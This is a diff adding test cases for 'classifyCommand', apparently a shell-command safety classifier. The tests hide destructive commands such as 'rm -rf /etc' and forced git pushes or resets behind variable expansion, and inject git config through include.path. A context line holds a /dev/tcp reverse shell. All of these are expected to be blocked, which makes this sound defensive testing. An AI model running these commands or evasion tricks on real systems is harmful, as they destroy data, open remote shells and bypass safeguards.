@@ -846,6 +846,74 @@ describe("classifyCommand", () => {
     });
   });
 
+  describe("argument-position expansion resolution (round 6)", () => {
+    test('target=/etc; rm -rf "$target" expands to rm -rf /etc', () => {
+      expect(classifyCommand('target=/etc; rm -rf "$target"').ok).toBe(false);
+    });
+
+    test("f=f; rm -r$f /etc splits flag through expansion", () => {
+      expect(classifyCommand("f=f; rm -r$f /etc").ok).toBe(false);
+    });
+
+    test("force=--force; git push $force origin main expands to --force", () => {
+      expect(classifyCommand("force=--force; git push $force origin main").ok).toBe(false);
+    });
+
+    test("target=/etc; rm -rf brace-form variable expansion", () => {
+      // biome-ignore lint/suspicious/noTemplateCurlyInString: literal bash ${VAR}, not a JS template placeholder
+      expect(classifyCommand("target=/etc; rm -rf ${target}").ok).toBe(false);
+    });
+
+    test("hard=--hard; git reset $hard expands to --hard", () => {
+      expect(classifyCommand("hard=--hard; git reset $hard").ok).toBe(false);
+    });
+
+    test("multiple assignments resolve in order", () => {
+      expect(classifyCommand("a=-r; b=-f; rm $a $b /etc").ok).toBe(false);
+    });
+
+    test("unresolved $VAR at command position is still flagged", () => {
+      // Preserves the round-5 command-position guard for unresolved names.
+      expect(classifyCommand("$CMD -rf /").ok).toBe(false);
+    });
+
+    test("benign assignment-and-use is not flagged", () => {
+      expect(classifyCommand("DIR=docs; ls $DIR").ok).toBe(true);
+    });
+  });
+
+  describe("git include.path config bypass (round 6)", () => {
+    test("git -c include.path=/tmp/evil.cfg fp origin main", () => {
+      expect(classifyCommand("git -c include.path=/tmp/evil.cfg fp origin main").ok).toBe(false);
+    });
+
+    test("git --config=include.path=/tmp/evil.cfg pu origin", () => {
+      expect(classifyCommand("git --config=include.path=/tmp/evil.cfg pu origin").ok).toBe(false);
+    });
+
+    test("git --config-env=include.path=EVIL_CFG fp origin", () => {
+      expect(classifyCommand("git --config-env=include.path=EVIL_CFG fp origin").ok).toBe(false);
+    });
+
+    test("git -c includeIf.branch:main.path=/tmp/evil.cfg pu", () => {
+      expect(classifyCommand("git -c includeIf.branch:main.path=/tmp/evil.cfg pu origin").ok).toBe(
+        false,
+      );
+    });
+
+    test("GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=include.path GIT_CONFIG_VALUE_0=/tmp/evil git pu", () => {
+      expect(
+        classifyCommand(
+          "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=include.path GIT_CONFIG_VALUE_0=/tmp/evil git pu origin main",
+        ).ok,
+      ).toBe(false);
+    });
+
+    test("git -c color.ui=false push origin main (benign config → allowed)", () => {
+      expect(classifyCommand("git -c color.ui=false push origin main").ok).toBe(true);
+    });
+  });
+
   describe("ClassificationResult shape", () => {
     test("blocked result has all required fields", () => {
       const result = classifyCommand("bash -i >& /dev/tcp/x/4444 0>&1");
